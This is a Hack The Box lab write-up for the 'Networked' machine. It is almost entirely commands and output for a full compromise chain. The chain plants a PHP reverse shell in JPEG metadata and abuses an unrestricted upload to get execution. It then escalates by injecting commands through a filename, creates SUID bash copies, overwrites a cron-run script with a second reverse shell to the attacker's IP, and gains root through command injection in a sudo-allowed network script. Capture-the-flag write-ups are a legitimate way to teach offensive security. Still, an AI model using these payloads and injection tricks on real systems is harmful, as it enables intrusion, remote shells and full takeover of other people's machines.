# Target
| Category          | Details                                                    |
|-------------------|------------------------------------------------------------|
| 📝 **Name**       | [Networked](https://app.hackthebox.com/machines/Networked) |  
| 🏷 **Type**       | HTB Machine                                                |
| 🖥️ **OS**        | Linux                                                      |
| 🎯 **Difficulty** | Easy                                                       |

# Attack path
1. [Enumerate web application directories](#enumerate-web-application-directories)
2. [Gain foothold with RCE due to unrestricted file upload and insecure server-side parsing](#gain-foothold-using-rce-due-to-unrestricted-file-upload-and-insecure-server-side-parsing)
3. [Escalate to `guly` user using command injection in `check_attack.php`](#escalate-to-guly-user-using-command-injection-in-check_attackphp)
4. [Escalate to `root` user using command injection in `changename.sh`](#escalate-to-root-user-using-command-injection-in-changenamesh)

### Enumerate web application directories
```
┌──(magicrc㉿perun)-[~/attack/HTB Networked]
└─$ feroxbuster --url http://$TARGET -w /usr/share/wordlists/dirb/big.txt -x php -k -C 404 -q
```

`upload.php` and `photos.php` were found together with `backup.tar` containing PHP source code. 

### Gain foothold using RCE due to unrestricted file upload and insecure server-side parsing

#### Prepare reverse shell payload in JPEG comment metadata
```
┌──(magicrc㉿perun)-[~/attack/HTB Networked]
└─$ LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) && \
LPORT=4444 && \
convert -size 1x1 xc:white shell.php.jpg
exiftool -comment="<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'\"); ?>" shell.php.jpg
```

#### Listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Networked]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
```

#### Upload and execute reverse shell code
```
┌──(magicrc㉿perun)-[~/attack/HTB Networked]
└─$ LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) && \
curl http://$TARGET/upload.php -F "myFile=@shell.php.jpg" -F "submit=go" && \
curl http://$TARGET/uploads/${LHOST//./_}.php.jpg
<p>file uploaded, refresh gallery</p>
```

#### Confirm foothold
```
connect to [10.10.14.161] from (UNKNOWN) [10.129.130.209] 44362
bash: no job control in this shell
bash-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
```

### Escalate to `guly` user using command injection in `check_attack.php`
We can inject command in filename that is passed to `exec` in `$value`, `check_attack.php` is executed every 3 minutes by `guly`.
```
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```

#### Inject command to create empty `user_shell`
```
bash-4.2$ touch "/var/www/html/uploads/;touch user_shell;chmod 777 user_shell" && \
while [ ! -f /home/guly/user_shell ]; do sleep 1; done
```

#### Copy `/bin/bash` to `user_shell`
```
bash-4.2$ cp /bin/bash /home/guly/user_shell
cp /bin/bash /home/guly/user_shell
```

#### Inject command to set SUID on `user_shell`
```
bash-4.2$ touch "/var/www/html/uploads/;chmod 4777 user_shell" && \
while [ $((0x$(stat -c %f /home/guly/user_shell 2>/dev/null) & 0x800)) -eq 0 ]; do sleep 1; done
```

#### Execute `user_shell` to partially escalate to `guly`
```
bash-4.2$ /home/guly/user_shell -p
/home/guly/user_shell -p
id
uid=48(apache) gid=48(apache) euid=1000(guly) groups=48(apache)
```

#### Listen for 2nd reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Networked]
└─$ nc -lnvp 5555
listening on [any] 5555 ...
```

#### Overwrite `check_attack.php` with reverse shell
```
rm /home/guly/check_attack.php && \
echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.161/5555 0>&1'\"); ?>" > /home/guly/check_attack.php
```

#### Confirm full escalation to `guly` user
```
connect to [10.10.14.161] from (UNKNOWN) [10.129.130.209] 47734
bash: no job control in this shell
[guly@networked ~]$ id
id
uid=1000(guly) gid=1000(guly) groups=1000(guly)
```

### Escalate to `root` user using command injection in `changename.sh`

User `guly` can execute `/usr/local/sbin/changename.sh` as `root`.
```
User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```
Which is vulnerable to command injection in environment variable in part of `/etc/sysconfig/network-scripts/ifcfg-guly` network interface configuration.

#### Prepare exploit to create root shell
```
echo "cp /bin/bash /tmp/root_shell;chmod +s /tmp/root_shell" > /tmp/exploit && chmod +x /tmp/exploit
```

#### Inject path to exploit in `NAME` variable
```
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
ps /tmp/exploit
interface PROXY_METHOD:
1
interface BROWSER_ONLY:
1
interface BOOTPROTO:
1
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
```

#### Execute root shell
```
[guly@networked ~]$ /tmp/root_shell -p
/tmp/root_shell -p
id
uid=1000(guly) gid=1000(guly) euid=0(root) egid=0(root) groups=0(root),1000(guly)
```